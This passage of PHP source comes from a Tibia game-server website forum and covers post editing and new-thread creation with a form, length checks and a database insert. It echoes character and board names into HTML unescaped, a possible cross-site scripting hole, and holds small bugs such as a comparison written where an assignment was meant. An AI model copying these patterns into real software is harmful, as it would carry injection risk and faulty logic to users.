						<form action="?" method="POST">
						<input type="hidden" name="action" value="edit_post" />
						<input type="hidden" name="id" value="'.$post_id.'" />
						<input type="hidden" name="subtopic" value="forum" />
						<input type="hidden" name="save" value="save" />
						
						</br>
						<table cellspacing="1" width="100%" style="background-color:'.$config['site']['vdarkborder'].'; border: 1px solid #3c3c3c;">
							<tr height="26" bgcolor="#3c3c3c"><td colspan="2"><table><tbody><tr><td><font color="white"><b><img src="images/new_post.gif"/> Edit Thread Post</b></font></td></tr></tbody></table></td></tr>
							<tr bgcolor="'.$config['site']['darkborder'].'"><td width="220"><table><tbody><tr><td><b>Tibia Character:</b></td></tr></tbody></table></td><td><table><tbody>
						<tr><td><select name="char_id"><option value="0">(Choose Character)</option>';
                        foreach($players_from_account as $player)
                        {
                            $main_content .= '<option value="'.$player['id'].'"';
                            if($player['id'] == $char_id)
                                $main_content .= ' selected="selected"';
                            $main_content .= '>'.$player['name'].'</option>';
                        }
                        $main_content .= '</select></td></tr> </tbody></table></tr>
						<tr bgcolor="'.$config['site']['lightborder'].'"><td><table><tbody><tr><td><b>Topic:</b></td></td></tr></tbody></table><td><table><tbody><tr><td><input type="text" name="topic" value="'.htmlspecialchars($post_topic).'" size="40" maxlength="60" /></td></tr></tbody></table></tr>
						<tr bgcolor="'.$config['site']['darkborder'].'"><td><table><tbody><tr><td width="50%"><b>Message:</b><font size="1"><br/><br/>Replace Codes:<br /><b>[player]</b> playername <b>[/player]</b><br><b>[youtube]</b>tg00YEETFzg<b>[youtube]</b><br>(Ex: www.youtube.com/watch?v=<font color="yellow" style="font-size: xx-small;"><b>tg00YEETFzg</b></font>&feature=player)<br/><b>[url]</b> www.google.com.br <b>[/url]</b><br/><b>[quote]</b> text <b>[/quote]</b><br/><b>[img]</b> imagedirectlink <b>[/img]</b><br /><b>[code]</b> codetext <b>[/code]</b><br /><b>[b]</b> boldtext <b>[/b]</b> (Ex: <b>teste</b>)<br /><b>[i]</b> italictext <b>[/i]</b> (Ex: <i>teste</i>)<br /><b>[u]</b> underlinetext <b>[/u]</b> (Ex: <u>teste</u>)<br /></td></tr><tr><td><table width="200"><tbody><tr><td colspan="2"><br><small>How to use smileys:</small></td></tr><tr><td width="12"><img src="images/smile/1.gif"/></td><td>:D  ;D</td> <td><img src="images/smile/17.gif"/></td><td>:what:</td></tr><tr><td width="12"><img src="images/smile/2.gif"/></td><td>:cool:</td> <td><img src="images/smile/19.gif"/></td><td>:arrow:</td></tr><tr><td width="12"><img src="images/smile/3.gif"/></td><td>:eek:</td> <td><img src="images/smile/9.gif"/></td><td>;d :d</td></tr><tr><td width="12"><img src="images/smile/4.gif"/></td><td>:o ;o</td> <td><img src="images/smile/16.gif"/></td><td>(6)</td></tr><tr><td width="12"><img src="images/smile/5.gif"/></td><td>:(  ;(</td> <td><img src="images/smile/18.gif"/></td><td>(y)</td></tr><tr><td width="12"><img src="images/smile/6.gif"/></td><td>:mad:</td> <td><img src="images/smile/20.gif"/></td><td>(n)</td></tr><tr><td width="12"><img src="images/smile/7.gif"/></td><td>:rolleyes:</td> <td><img src="images/smile/21.gif"/></td><td>(?)</td></tr><tr><td width="12"><img src="images/smile/8.gif"/></td><td>:)</td> <td><img src="images/smile/22.gif"/></td><td>(l)</td></tr></tbody></table></tr></tbody></table><td><table><tbody><tr><td><textarea rows="20" cols="51" name="text">'.htmlspecialchars($text).'</textarea><br /></td></tr></tbody></table></tr>
                        <tr bgcolor="'.$config['site']['lightborder'].'"><td><table><tbody><tr><td><b>Options:</b></td></tr></tbody></table><td><table><tbody><tr><td><label><input type="checkbox" name="smile" value="1"';
                        if($smile == 1)
                            $main_content .= ' checked="checked"';
                        $main_content .= '/></label> <small>Disable Smileys in This Post</small></td></tr></tbody></table></tr></table><td><table width="40%" align="center"><tbody width="30%" align="center"><tr><td><input type="submit" value="Save Post"/></td><td><input type="reset" value="Reset Fields"/></td></tr></tbody></table></form>';
                    }
                }
                else
                    $main_content .= '<br />You are not an author of this post.';
            }
            else
                $main_content .= '<br />Post with ID '.$post_id.' doesn\'t exist.';
        }
        else
            $main_content .= '<br />Thread is closed. You can\'t post.';
        }
        else
            $main_content .= '<br />Your account is banned, deleted or you don\'t have any player with level '.$level_limit.' on your account. You can\'t post.';
    }
    else
        header('Location: ?subtopic=forum&action=login&redirect=forum');
}


if($action == 'new_topic')
{
    if($logged)
    {
        if(canPost($account_logged) || $group_id_of_acc_logged >= $group_not_blocked)
        {
            $players_from_account = $SQL->query("SELECT `players`.`name`, `players`.`id` FROM `players` WHERE `players`.`account_id` = ".(int) $account_logged->getId())->fetchAll();
            $section_id = (int) $_REQUEST['section_id'];
			$main_content .= '
			<table cellspacing="0" width="100%" style="background-color:#3c3c3c; border: 1px solid #3c3c3c;">
				<tr bgcolor="#3c3c3c"><td height="16" colspan="2"><table width="100%"><tbody><tr><td><font color="white" size="1"><b>Forum Information</b></font></td></tr></tbody></table></td></tr>
				<tr bgcolor="'.$config['site']['darkborder'].'"><td height="16"><table width="100%"><tbody><tr><td><b><font color="#262b26" size="1">Navigator:</font></font> <font color="white" size="1"><a href="?subtopic=forum">Boards</a> <font size="1" color="#262b26">�</font> <a href="?subtopic=forum&action=show_board&id='.$section_id.'">'.$sections[$section_id].'</a> <font size="1" color="#FFFFFF">�</font> <b>Post New Thread</b></font></td></tr></tbody></table></td></tr></tbody></table></td></tr>
			</table><br/>';
			
			if(isset($sections[$section_id]))
            {
                if($section_id == 1 && $group_id_of_acc_logged < $group_not_blocked)
                    $errors[] = 'Only moderators and admins can post on news board.';
                $quote = (int) $_REQUEST['quote'];
                $text = stripslashes(trim(codeLower($_REQUEST['text'])));
                $char_id = (int) $_REQUEST['char_id'];
                $post_topic = stripslashes(trim($_REQUEST['topic']));
                $smile = (int) $_REQUEST['smile'];
                $saved = false;
                if(isset($_REQUEST['save']))
                {
                    $lenght = 0;
                    for($i = 0; $i <= strlen($post_topic); $i++)
                    {
                        if(ord($post_topic[$i]) >= 33 && ord($post_topic[$i]) <= 126)
                            $lenght++;
                    }
                    if($lenght < 1 || strlen($post_topic) > 60)
                        $errors[] = 'Too short or too long topic (short: '.$lenght.' long: '.strlen($post_topic).' letters). Minimum 1 letter, maximum 60 letters.';
                    $lenght = 0;
                    for($i = 0; $i <= strlen($text); $i++)
                    {
                        if(ord($text[$i]) >= 33 && ord($text[$i]) <= 126)
                            $lenght++;
                    }
                    if($lenght < 1 || strlen($text) > 15000)
                        $errors[] = 'Too short or too long post (short: '.$lenght.' long: '.strlen($text).' letters). Minimum 1 letter, maximum 15000 letters.';
                    if($char_id == 0)
                        $errors[] = 'Please select a character.';
                    $player_on_account == false;
                    if(count($errors) == 0)
                    {
                        foreach($players_from_account as $player)
                            if($char_id == $player['id'])
                                $player_on_account = true;
                        if(!$player_on_account)
                            $errors[] = 'Player with selected ID '.$char_id.' doesn\'t exist or isn\'t on your account';
                    }
                    if(count($errors) == 0)
                    {
                        $last_post = $account_logged->getCustomField('last_post');
                        if($last_post+$post_interval-time() > 0 && $group_id_of_acc_logged < $group_not_blocked)
                            $errors[] = 'You can post one time per '.$post_interval.' seconds. Next post after '.($last_post+$post_interval-time()).' second(s).';
                    }
                    if(count($errors) == 0)
                    {
                        $saved = true;
                        $account_logged->setCustomField('last_post', time());
                        $SQL->query("INSERT INTO `z_forum` (`id` ,`first_post` ,`last_post` ,`section` ,`replies` ,`views` ,`author_aid` ,`author_guid` ,`post_text` ,`post_topic` ,`post_smile` ,`post_date` ,`last_edit_aid` ,`edit_date`, `post_ip`) VALUES ('NULL', '0', '".time()."', '".(int) $section_id."', '0', '0', '".$account_logged->getId()."', '".(int) $char_id."', ".$SQL->quote($text).", ".$SQL->quote($post_topic).", '".(int) $smile."', '".time()."', '0', '0', '".$_SERVER['REMOTE_ADDR']."')");
                        $thread_id = $SQL->lastInsertId();
                        $SQL->query("UPDATE `z_forum` SET `first_post`=".(int) $thread_id." WHERE `id` = ".(int) $thread_id);
                        header('Location: ?subtopic=forum&action=show_thread&id='.$thread_id);
                        $main_content .= '<br />Thank you for posting.<br /><a href="?subtopic=forum&action=show_thread&id='.$thread_id.'">GO BACK TO LAST THREAD</a>';
                    }
                }
                if(!$saved)
                {
                    if(count($errors) > 0)
                    {
                        $main_content .= '<font color="red" size="2"><b>Errors occured:</b>';
                        foreach($errors as $error)
                            $main_content .= '<br />* '.$error;
                        $main_content .= '</font><br />';
                    }
                    $main_content .= '
					<form action="?" method="POST">
						<input type="hidden" name="action" value="new_topic" />
						<input type="hidden" name="section_id" value="'.$section_id.'" />
						<input type="hidden" name="subtopic" value="forum" />
						<input type="hidden" name="save" value="save" />
						</br>
							<table cellspacing="1" width="100%" style="background-color:'.$config['site']['vdarkborder'].'; border: 1px solid #3c3c3c;">
								<tr height="26" bgcolor="#3c3c3c">
									<td colspan="2">
										<table><tbody><tr><td>
											<font color="white"><b><img src="images/new_post.gif"/> Post New Thread</b></font>
										</td></tr></tbody></table>
									</td>
								</tr>
								<tr bgcolor="'.$config['site']['darkborder'].'"><td width="220"><table><tbody><tr><td><b>Tibia Character:</b></td></tr></tbody></table></td><td><table><tbody><tr><td><select name="char_id">
									<option value="0">(Choose Character)</option>';
                    foreach($players_from_account as $player)
                    {
                        $main_content .= '<option value="'.$player['id'].'"';
                        if($player['id'] == $char_id)
                            $main_content .= ' selected="selected"';
                        $main_content .= '>'.$player['name'].'</option>';
                    }
                    $main_content .= '</select></td></tr></tbody></table></tr><tr bgcolor="'.$config['site']['lightborder'].'">
					<td><table><tbody><tr><td><b>Topic:</b></td></td></tr></tbody></table><td><table><tbody><tr><td><input type="text" name="topic" value="'.htmlspecialchars($post_topic).'" size="40" maxlength="60" /></td></tr></tbody></table></tr>
                    <tr bgcolor="'.$config['site']['darkborder'].'">
					<td><table><tbody><tr><td width="50%"><b>Message:</b><font size="1">
					<br/><br/>Replace Codes:<br /><b>[player]</b> playername <b>[/player]</b><br/><b>[youtube]</b>tg00YEETFzg<b>[youtube]</b><br>(Ex: www.youtube.com/watch?v=<font color="yellow" style="font-size: xx-small;"><b>tg00YEETFzg</b></font>&feature=player)<br><b>[url]</b> www.google.com.br <b>[/url]</b><br/><b>[quote]</b> text <b>[/quote]</b><br/><b>[img]</b> imagedirectlink <b>[/img]</b><br /><b>[code]</b> codetext <b>[/code]</b><br /><b>[b]</b> boldtext <b>[/b]</b> (Ex: <b>teste</b>)<br /><b>[i]</b> italictext <b>[/i]</b> (Ex: <i>teste</i>)<br /><b>[u]</b> underlinetext <b>[/u]</b> (Ex: <u>teste</u>)<br />
					</td></tr><tr><td><table width="200"><tbody><tr>
					<td colspan="2"><br><small>How to use smileys:</small></td></tr>
					<tr><td width="12"><img src="images/smile/1.gif"/></td><td>:D  ;D</td> <td><img src="images/smile/17.gif"/></td><td>:what:</td></tr>
					<tr><td width="12"><img src="images/smile/2.gif"/></td><td>:cool:</td> <td><img src="images/smile/19.gif"/></td><td>:arrow:</td></tr>
					<tr><td width="12"><img src="images/smile/3.gif"/></td><td>:eek:</td> <td><img src="images/smile/9.gif"/></td><td>;d :d</td></tr>
					<tr><td width="12"><img src="images/smile/4.gif"/></td><td>:o ;o</td> <td><img src="images/smile/16.gif"/></td><td>(6)</td></tr>
					<tr><td width="12"><img src="images/smile/5.gif"/></td><td>:(  ;(</td> <td><img src="images/smile/18.gif"/></td><td>(y)</td></tr>
					<tr><td width="12"><img src="images/smile/6.gif"/></td><td>:mad:</td> <td><img src="images/smile/20.gif"/></td><td>(n)</td></tr>
					<tr><td width="12"><img src="images/smile/7.gif"/></td><td>:rolleyes:</td> <td><img src="images/smile/21.gif"/></td><td>(?)</td></tr>
					<tr><td width="12"><img src="images/smile/8.gif"/></td><td>:)</td> <td><img src="images/smile/22.gif"/></td><td>(l)</td></tr>
					
					</tbody></table></tr></tbody></table><td><table><tbody><tr><td><textarea rows="20" cols="51" name="text">'.htmlspecialchars($text).'</textarea><br /></td></tr></tbody></table></tr>
					<tr bgcolor="'.$config['site']['lightborder'].'"><td><table><tbody><tr><td><b>Options:</b></td></tr></tbody></table><td><table><tbody><tr><td><label><input type="checkbox" name="smile" value="1"';
                    if($smile == 1)
                        $main_content .= ' checked="checked"';
                    $main_content .= '/></label> <small>Disable Smileys in This Post</small></td></tr></tbody></table></tr></table><td><table width="40%" align="center"><tbody width="30%" align="center"><tr><td><input type="submit" value="Submit Thread"/></td><td><input type="reset" value="Reset Fields"/></td></tr></tbody></table></form>';
                }
            }
            else
                $main_content .= 'Board with ID '.$board_id.' doesn\'t exist.';
        }
        else
            $main_content .= 'Your account is banned, deleted or you don\'t have any player with level '.$level_limit.' on your account. You can\'t post.';
    }
    else
        header('Location: ?subtopic=forum&action=login&redirect=forum');
}
?>